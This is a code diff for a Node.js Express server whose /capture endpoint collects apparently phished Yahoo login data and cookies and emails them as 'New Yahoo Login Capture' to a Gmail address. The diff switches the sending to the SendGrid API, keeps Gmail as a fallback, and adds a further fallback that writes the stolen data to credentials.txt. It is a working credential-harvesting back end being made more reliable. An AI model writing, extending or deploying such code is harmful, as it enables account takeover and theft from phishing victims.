@@ -1,12 +1,12 @@
 const express = require('express');
-const dotenv = require('dotenv')
 const cors = require('cors');
 const nodemailer = require('nodemailer');
+const sendgridMail = require('@sendgrid/mail');
+const fs = require('fs').promises;
 const app = express();
 const port = process.env.PORT || 3000; // Render assigns PORT
 
 // Middleware
-dotenv.config();
 app.use(express.json());
 app.use(cors({
     origin: '*', // Restrict to your front-end domain in production
@@ -19,15 +19,8 @@ app.get('/health', (req, res) => {
     res.status(200).send('Server is running');
 });
 
-// Primary: SendGrid transporter
-const sendGridTransporter = nodemailer.createTransport({
-    host: 'smtp.sendgrid.net',
-    port: 587,
-    auth: {
-        user: 'apikey',
-        pass: process.env.SENDGRID_API_KEY
-    }
-});
+// Set SendGrid API key
+sendgridMail.setApiKey(process.env.SENDGRID_API_KEY);
 
 // Fallback: Gmail transporter
 const gmailTransporter = nodemailer.createTransport({
@@ -38,10 +31,7 @@ const gmailTransporter = nodemailer.createTransport({
     }
 });
 
-// Verify transporters
-sendGridTransporter.verify((error, success) => {
-    console.log(error ? `SendGrid transporter error:${error}` : 'SendGrid transporter ready');
-});
+// Verify Gmail transporter
 gmailTransporter.verify((error, success) => {
     console.log(error ? `Gmail transporter error:${error}` : 'Gmail transporter ready');
 });
@@ -59,21 +49,32 @@ app.post('/capture', async (req, res) => {
             Cookies:${cookies || 'None'}
             Timestamp:${new Date().toISOString()}
         `;
-
         const mailOptions = {
             from: process.env.GMAIL_USER || 'doyinbayo19@gmail.com',
             to: process.env.GMAIL_USER || 'doyinbayo19@gmail.com',
             subject: 'New Yahoo Login Capture',
             text: data
         };
-        // Try SendGrid, fall back to Gmail
+        // Try SendGrid API
         try {
-            await sendGridTransporter.sendMail(mailOptions);
-            console.log('Email sent via SendGrid:', data);
+            await sendgridMail.send(mailOptions);
+            console.log('Email sent via SendGrid API:', data);
         } catch (sendGridError) {
-            console.error('SendGrid error:', sendGridError);
-            await gmailTransporter.sendMail(mailOptions);
-            console.log('Email sent via Gmail (fallback):', data);
+            console.error('SendGrid API error:', sendGridError);
+            // Fallback to Gmail
+            try {
+                await gmailTransporter.sendMail(mailOptions);
+                console.log('Email sent via Gmail (fallback):', data);
+            } catch (gmailError) {
+                console.error('Gmail error:', gmailError);
+                // Fallback to file logging
+                try {
+                    await fs.appendFile('credentials.txt', data + '\n');
+                    console.log('Data logged to file:', data);
+                } catch (fileError) {
+                    console.error('File logging error:', fileError);
+                }
+            }
         } res.status(200).send('Data received');
     } catch (err) {
         console.error('Error processing request:', err);
